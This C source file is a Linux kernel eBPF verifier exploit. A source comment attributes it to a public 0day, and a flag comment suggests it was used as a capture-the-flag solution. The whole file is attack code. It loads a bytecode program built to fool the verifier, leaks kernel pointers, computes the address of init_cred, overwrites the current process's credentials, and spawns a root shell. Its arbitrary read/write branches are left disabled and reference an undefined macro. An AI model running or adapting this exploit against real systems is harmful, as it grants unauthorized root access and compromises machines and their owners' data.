/* Based on
 * https://raw.githubusercontent.com/jas502n/Ubuntu-0day/master/upstream44.c */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <syscall.h>
#include <unistd.h>

/* linux/types.h */

typedef unsigned char __u8;
typedef unsigned short __u16;
typedef unsigned int __u32;
typedef unsigned long __u64;
typedef char __s8;
typedef short __s16;
typedef int __s32;
typedef long __s64;

#define __aligned_u64 __u64 __attribute__((aligned(8)))

/* linux/bpf_common.h */

#define BPF_CLASS(code) ((code)&0x07)
#define BPF_LD 0x00
#define BPF_LDX 0x01
#define BPF_ST 0x02
#define BPF_STX 0x03
#define BPF_ALU 0x04
#define BPF_JMP 0x05
#define BPF_RET 0x06
#define BPF_MISC 0x07

#define BPF_SIZE(code) ((code)&0x18)
#define BPF_W 0x00
#define BPF_H 0x08
#define BPF_B 0x10
#define BPF_MODE(code) ((code)&0xe0)
#define BPF_IMM 0x00
#define BPF_ABS 0x20
#define BPF_IND 0x40
#define BPF_MEM 0x60
#define BPF_LEN 0x80
#define BPF_MSH 0xa0

#define BPF_OP(code) ((code)&0xf0)
#define BPF_ADD 0x00
#define BPF_SUB 0x10
#define BPF_MUL 0x20
#define BPF_DIV 0x30
#define BPF_OR 0x40
#define BPF_AND 0x50
#define BPF_LSH 0x60
#define BPF_RSH 0x70
#define BPF_NEG 0x80
#define BPF_MOD 0x90
#define BPF_XOR 0xa0

#define BPF_JA 0x00
#define BPF_JEQ 0x10
#define BPF_JGT 0x20
#define BPF_JGE 0x30
#define BPF_JSET 0x40
#define BPF_SRC(code) ((code)&0x08)
#define BPF_K 0x00
#define BPF_X 0x08

/* linux/bpf.h. */

#define BPF_JMP32 0x06
#define BPF_ALU64 0x07

#define BPF_DW 0x18
#define BPF_XADD 0xc0

#define BPF_MOV 0xb0
#define BPF_ARSH 0xc0

#define BPF_END 0xd0
#define BPF_TO_LE 0x00
#define BPF_TO_BE 0x08
#define BPF_FROM_LE BPF_TO_LE
#define BPF_FROM_BE BPF_TO_BE

#define BPF_JNE 0x50
#define BPF_JLT 0xa0
#define BPF_JLE 0xb0
#define BPF_JSGT 0x60
#define BPF_JSGE 0x70
#define BPF_JSLT 0xc0
#define BPF_JSLE 0xd0
#define BPF_CALL 0x80
#define BPF_EXIT 0x90

enum {
  BPF_REG_0 = 0,
  BPF_REG_1,
  BPF_REG_2,
  BPF_REG_3,
  BPF_REG_4,
  BPF_REG_5,
  BPF_REG_6,
  BPF_REG_7,
  BPF_REG_8,
  BPF_REG_9,
  BPF_REG_10,
  __MAX_BPF_REG,
};

struct bpf_insn {
  __u8 code;
  __u8 dst_reg : 4;
  __u8 src_reg : 4;
  __s16 off;
  __s32 imm;
};

enum bpf_cmd {
  BPF_MAP_CREATE,
  BPF_MAP_LOOKUP_ELEM,
  BPF_MAP_UPDATE_ELEM,
  BPF_MAP_DELETE_ELEM,
  BPF_MAP_GET_NEXT_KEY,
  BPF_PROG_LOAD,
};

enum bpf_map_type {
  BPF_MAP_TYPE_UNSPEC,
  BPF_MAP_TYPE_HASH,
  BPF_MAP_TYPE_ARRAY,
};

enum bpf_prog_type {
  BPF_PROG_TYPE_UNSPEC,
  BPF_PROG_TYPE_SOCKET_FILTER,
};

#define BPF_PSEUDO_MAP_FD 1
#define BPF_PSEUDO_MAP_VALUE 2

#define BPF_OBJ_NAME_LEN 16U

union bpf_attr {
  struct {
    __u32 map_type;
    __u32 key_size;
    __u32 value_size;
    __u32 max_entries;
    __u32 map_flags;
    __u32 inner_map_fd;
    __u32 numa_node;
    char map_name[BPF_OBJ_NAME_LEN];
    __u32 map_ifindex;
    __u32 btf_fd;
    __u32 btf_key_type_id;
    __u32 btf_value_type_id;
  };

  struct {
    __u32 map_fd;
    __aligned_u64 key;
    union {
      __aligned_u64 value;
      __aligned_u64 next_key;
    };
    __u64 flags;
  };

  struct {
    __u32 prog_type;
    __u32 insn_cnt;
    __aligned_u64 insns;
    __aligned_u64 license;
    __u32 log_level;
    __u32 log_size;
    __aligned_u64 log_buf;
    __u32 kern_version;
    __u32 prog_flags;
    char prog_name[BPF_OBJ_NAME_LEN];
    __u32 prog_ifindex;
    __u32 expected_attach_type;
    __u32 prog_btf_fd;
    __u32 func_info_rec_size;
    __aligned_u64 func_info;
    __u32 func_info_cnt;
    __u32 line_info_rec_size;
    __aligned_u64 line_info;
    __u32 line_info_cnt;
  };
} __attribute__((aligned(8)));

#define __BPF_FUNC_MAPPER(FN)                                                  \
  FN(unspec), FN(map_lookup_elem), FN(map_update_elem),

/* integer value in 'imm' field of BPF_CALL instruction selects which helper
 * function eBPF program intends to call
 */
#define __BPF_ENUM_FN(x) BPF_FUNC_##x
enum bpf_func_id {
  __BPF_FUNC_MAPPER(__BPF_ENUM_FN) __BPF_FUNC_MAX_ID,
};
#undef __BPF_ENUM_FN

/* man 2 bpf */

static char bpf_log_buf[65536];

static int bpf_prog_load(enum bpf_prog_type prog_type,
                         const struct bpf_insn *insns, int insn_cnt,
                         const char *license) {
  union bpf_attr attr = {
      .prog_type = prog_type,
      .insns = (__u64)insns,
      .insn_cnt = insn_cnt,
      .license = (__u64)license,
      .log_buf = (__u64)bpf_log_buf,
      .log_size = sizeof(bpf_log_buf),
      .log_level = 2,
  };

  return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size,
                          int value_size, int max_entries) {
  union bpf_attr attr = {.map_type = map_type,
                         .key_size = key_size,
                         .value_size = value_size,
                         .max_entries = max_entries};

  return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(int fd, const void *key, const void *value,
                           uint64_t flags) {
  union bpf_attr attr = {
      .map_fd = fd,
      .key = (__u64)key,
      .value = (__u64)value,
      .flags = flags,
  };

  return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_lookup_elem(int fd, const void *key, void *value) {
  union bpf_attr attr = {
      .map_fd = fd,
      .key = (__u64)key,
      .value = (__u64)value,
  };

  return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

/* tools/include/linux/filter.h */

#define BPF_ALU64_REG(OP, DST, SRC)                                            \
  ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_X,                   \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = 0})

#define BPF_ALU32_REG(OP, DST, SRC)                                            \
  ((struct bpf_insn){.code = BPF_ALU | BPF_OP(OP) | BPF_X,                     \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = 0})

#define BPF_ALU64_IMM(OP, DST, IMM)                                            \
  ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_K,                   \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = IMM})

#define BPF_ALU32_IMM(OP, DST, IMM)                                            \
  ((struct bpf_insn){.code = BPF_ALU | BPF_OP(OP) | BPF_K,                     \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = IMM})

#define BPF_ENDIAN(TYPE, DST, LEN)                                             \
  ((struct bpf_insn){.code = BPF_ALU | BPF_END | BPF_SRC(TYPE),                \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = LEN})

#define BPF_MOV64_REG(DST, SRC)                                                \
  ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X,                      \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = 0})

#define BPF_MOV32_REG(DST, SRC)                                                \
  ((struct bpf_insn){.code = BPF_ALU | BPF_MOV | BPF_X,                        \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = 0})

#define BPF_MOV64_IMM(DST, IMM)                                                \
  ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K,                      \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = IMM})

#define BPF_MOV32_IMM(DST, IMM)                                                \
  ((struct bpf_insn){.code = BPF_ALU | BPF_MOV | BPF_K,                        \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = IMM})

#define BPF_MOV64_RAW(TYPE, DST, SRC, IMM)                                     \
  ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_SRC(TYPE),              \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = IMM})

#define BPF_MOV32_RAW(TYPE, DST, SRC, IMM)                                     \
  ((struct bpf_insn){.code = BPF_ALU | BPF_MOV | BPF_SRC(TYPE),                \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = IMM})

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)                                       \
  ((struct bpf_insn){.code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,               \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = OFF,                                               \
                     .imm = 0})

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)                                       \
  ((struct bpf_insn){.code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,               \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = OFF,                                               \
                     .imm = 0})

#define BPF_ST_MEM(SIZE, DST, OFF, IMM)                                        \
  ((struct bpf_insn){.code = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,                \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = OFF,                                               \
                     .imm = IMM})

#define BPF_JMP_REG(OP, DST, SRC, OFF)                                         \
  ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_X,                     \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = OFF,                                               \
                     .imm = 0})

#define BPF_JMP32_REG(OP, DST, SRC, OFF)                                       \
  ((struct bpf_insn){.code = BPF_JMP32 | BPF_OP(OP) | BPF_X,                   \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = OFF,                                               \
                     .imm = 0})

#define BPF_JMP_IMM(OP, DST, IMM, OFF)                                         \
  ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_K,                     \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = OFF,                                               \
                     .imm = IMM})

#define BPF_JMP32_IMM(OP, DST, IMM, OFF)                                       \
  ((struct bpf_insn){.code = BPF_JMP32 | BPF_OP(OP) | BPF_K,                   \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = OFF,                                               \
                     .imm = IMM})

#define BPF_JMP_A(OFF)                                                         \
  ((struct bpf_insn){.code = BPF_JMP | BPF_JA,                                 \
                     .dst_reg = 0,                                             \
                     .src_reg = 0,                                             \
                     .off = OFF,                                               \
                     .imm = 0})

#define BPF_EMIT_CALL(FUNC)                                                    \
  ((struct bpf_insn){.code = BPF_JMP | BPF_CALL,                               \
                     .dst_reg = 0,                                             \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = ((FUNC)-BPF_FUNC_unspec)})

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)                                 \
  ((struct bpf_insn){                                                          \
      .code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)                                        \
  ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM,                        \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = (__u32)(IMM)}),                                    \
      ((struct bpf_insn){.code = 0,                                            \
                         .dst_reg = 0,                                         \
                         .src_reg = 0,                                         \
                         .off = 0,                                             \
                         .imm = ((__u64)(IMM)) >> 32})

#define BPF_LD_IMM64_RAW_FULL(DST, SRC, OFF1, OFF2, IMM1, IMM2)                \
  ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM,                        \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = OFF1,                                              \
                     .imm = IMM1}),                                            \
      ((struct bpf_insn){                                                      \
          .code = 0, .dst_reg = 0, .src_reg = 0, .off = OFF2, .imm = IMM2})

#define BPF_LD_MAP_FD(DST, MAP_FD)                                             \
  BPF_LD_IMM64_RAW_FULL(DST, BPF_PSEUDO_MAP_FD, 0, 0, MAP_FD, 0)

#define BPF_LD_MAP_VALUE(DST, MAP_FD, VALUE_OFF)                               \
  BPF_LD_IMM64_RAW_FULL(DST, BPF_PSEUDO_MAP_VALUE, 0, 0, MAP_FD, VALUE_OFF)

#define BPF_CALL_REL(TGT)                                                      \
  ((struct bpf_insn){.code = BPF_JMP | BPF_CALL,                               \
                     .dst_reg = 0,                                             \
                     .src_reg = BPF_PSEUDO_CALL,                               \
                     .off = 0,                                                 \
                     .imm = TGT})

#define BPF_EXIT_INSN()                                                        \
  ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT,                               \
                     .dst_reg = 0,                                             \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = 0})

/* helpers */

static void __die_errno(const char *path, int line, const char *msg) {
  fprintf(stderr, "%s:%d: ", path, line);
  perror(msg);
  exit(1);
}

#define die_errno(msg) __die_errno(__FILE__, __LINE__, msg)

static void __die(const char *path, int line, const char *msg) {
  fprintf(stderr, "%s:%d: %s\n", path, line, msg);
  exit(1);
}

#define die(msg) __die(__FILE__, __LINE__, msg)

/* initialization */

static int map_fd, prog_fd, sockets[2];

#define READ_U64 0
#define GET_FP 1
#define WRITE_U64 2
#define KEEP_ALIVE 3
#define BOGUS_ADDR 0x12345678

/* clang-format off */
#define LOAD_ELEM(DST, IDX)                                                    \
  /* r1 = map; */                                                              \
  BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                            \
  /* r2 = &key; */                                                             \
  BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                        \
  BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                                       \
  /* key = IDX; */                                                             \
  BPF_ST_MEM(BPF_W, BPF_REG_2, 0, (IDX)),                                      \
  /* r0 = &value; */                                                           \
  BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),         \
  /* if (r0 == NULL) return r0; */                                             \
  BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                                       \
  BPF_EXIT_INSN(),                                                             \
  /* DST = r0; */                                                              \
  BPF_MOV64_REG((DST), BPF_REG_0)
/* clang-format on */

#define ARRAY_OFFSET -32

union map_value {
  uint64_t n;
  char pad[8000];
};

static void prep(void) {
  cpu_set_t aff;
  CPU_ZERO(&aff);
  CPU_SET(0, &aff);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &aff) == -1)
    die_errno("sched_setaffinity");

  map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(union map_value), 3);
  if (map_fd < 0)
    die_errno("bpf_create_map");

  struct bpf_insn prog[] = {
      /* r7 = &cmd; r8 = addr; r9 = &val; */
      LOAD_ELEM(BPF_REG_7, 0),
      LOAD_ELEM(BPF_REG_8, 1),
      BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_8, 0),
      LOAD_ELEM(BPF_REG_9, 2),

      /* r0 = cmd */
      BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_7, 0),
      /* if (r0 == GET_FP) goto get_fp; */
      BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, GET_FP, 1),
#if 0
      /* if (r0 == READ_U64) goto read_u64; */
      BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, READ_U64, CONFUSE_VERIFIER_N + 7),
      /* if (r0 == WRITE_U64) goto write_u64; */
      BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, WRITE_U64, CONFUSE_VERIFIER_N * 2 + 12),
#endif
      /* return r0; */
      BPF_EXIT_INSN(),

      /* get_fp: */
      /* r0 = &cmd + 6000; */
      BPF_MOV64_IMM(BPF_REG_0, 6000),
      BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),
      /* r1 = {-6000 (actually), 0 (verifier)}; */
      BPF_MOV64_IMM(BPF_REG_1, -6000),
      BPF_MOV64_IMM(BPF_REG_2, 64),
      BPF_ALU64_REG(BPF_RSH, BPF_REG_1, BPF_REG_2),
      /* r1 += cmd >> 63; */
      BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_7, 0),
      BPF_ALU64_IMM(BPF_RSH, BPF_REG_2, 63),
      BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),
      /* r0 = {&cmd (actually), &cmd + 6000 (verifier)}; */
      BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),
      /* val = *(r0 - 8); */
      BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, -8),
      BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0),
      /* return; */
      BPF_EXIT_INSN(),
  };

  prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog,
                          sizeof(prog) / sizeof(prog[0]), "GPL");
  int saved_errno = errno;
  fprintf(stderr, "%s\n", bpf_log_buf);
  if (prog_fd < 0) {
    errno = saved_errno;
    die_errno("bpf_prog_load");
  }

  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) == -1)
    die_errno("socketpair");

  if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd,
                 sizeof(prog_fd)) == -1)
    die_errno("setsockopt");
}

/* communicating with prog */

static uint64_t call_prog(int cmd, uint64_t addr, uint64_t val) {
  for (int map_key = 0; map_key < 3; map_key++) {
    union map_value map_value;
    memset(&map_value, 0, sizeof(map_value));
    switch (map_key) {
    case 0:
      map_value.n = cmd;
      break;
    case 1:
      map_value.n = addr;
      break;
    case 2:
      map_value.n = val;
      break;
    }
    if (bpf_update_elem(map_fd, &map_key, &map_value, 0) < 0)
      die("bpf_update_elem");
  }

  char buffer[64];
  memset(buffer, 0, sizeof(buffer));
  ssize_t n = write(sockets[0], buffer, sizeof(buffer));
  if (n < 0)
    die_errno("write");
  if (n != sizeof(buffer))
    fprintf(stderr, "short write: %zd\n", n);

  int key = 2;
  union map_value result;
  result.n = 0xdeadbeefdeadbeefull;
  if (bpf_lookup_elem(map_fd, &key, &result) < 0)
    die_errno("bpf_lookup_elem");
  return result.n;
}

static uint64_t get_fp(void) { return call_prog(GET_FP, 0, 0); }

static uint64_t read_u64(uint64_t addr) { return call_prog(READ_U64, addr, 0); }

static void write_u64(uint64_t addr, uint64_t val) {
  call_prog(WRITE_U64, addr, val);
}

extern char **environ;

static void pwn(void) {
  uint64_t fp = get_fp();
  printf("fp=0x%" PRIx64 "\n", fp);

  uint64_t fp8 = read_u64(fp + 8);
  const uint64_t abs_vmlinux = 0xffffffff81000000ull;
  const uint64_t abs_fp8 = 0xffffffff818f4b00ull;
  uint64_t vmlinux = fp8 - (abs_fp8 - abs_vmlinux);
  printf("vmlinux=0x%" PRIx64 "\n", vmlinux);

  const uint64_t abs_pcpu_base_addr = 0xffffffff82688f00ull;
  uint64_t pcpu_base_addr = vmlinux + (abs_pcpu_base_addr - abs_vmlinux);
  printf("pcpu_base_addr=0x%" PRIx64 "\n", pcpu_base_addr);

  uint64_t percpu0 = read_u64(pcpu_base_addr);
  printf("percpu0=0x%" PRIx64 "\n", percpu0);

  const uint64_t current_gs_offset = 0x16d00ull;
  uint64_t current0 = read_u64(percpu0 + current_gs_offset);
  printf("current0=0x%" PRIx64 "\n", current0);

  const uint64_t abs_init_cred = 0xffffffff8284d340ull;
  uint64_t init_cred = vmlinux + (abs_init_cred - abs_vmlinux);
  printf("init_cred=0x%" PRIx64 "\n", init_cred);

  const uint64_t offsetof_task_real_cred = 0x6d0;
  write_u64(current0 + offsetof_task_real_cred, init_cred);

  const uint64_t offsetof_task_cred = 0x6d8;
  write_u64(current0 + offsetof_task_cred, init_cred);

  if (getuid() == 0) {
    char bin_sh[] = "/bin/sh";
    char *argv[] = {bin_sh, NULL};
    /* CTF{wh0_v3r1f1e5_7h3_v3r1f1er_c9716a89aa5d92a} */
    execve(bin_sh, argv, environ);
    die_errno("execve");
  }

  die("not vulnerable");
}

int main(void) {
  prep();
  pwn();
  return 0;
}
